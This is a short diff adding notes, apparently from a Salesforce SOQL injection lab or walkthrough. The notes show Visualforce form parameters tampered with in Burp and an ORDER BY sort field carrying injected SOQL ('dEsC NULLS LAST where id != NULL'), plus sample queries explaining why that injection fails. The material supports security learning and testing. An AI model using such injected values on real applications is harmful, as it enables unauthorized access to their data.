@@ -1,0 +1,20 @@
+Using Burp (or browser devtools):
+
+j_id0%3Ablock1%3Aj_id37%3Aj_id38%3Aj_id40%3Aeasymode=true
+
+
+j_id0%3Ablock1%3Aj_id37%3Aj_id38%3Aj_id40%3Aj_id41%3Aj_id47&column=dEsC+NULLS+LAST
+
+
+# observe this does not work due to ordering
+dEsC+NULLS+LAST+where+id+!%3d+NULL
+
+Example: Try this back on SOQL 3:
+
+# works without error
+
+SELECT id,Name,Title,Phone FROM Contact where Name LIKE '%' ORDER BY Name dEsC NULLS LAST
+
+# versus this which encounters an error
+
+SELECT id,Name,Title,Phone FROM Contact ORDER BY Name dEsC NULLS LAST where Name LIKE '%' 
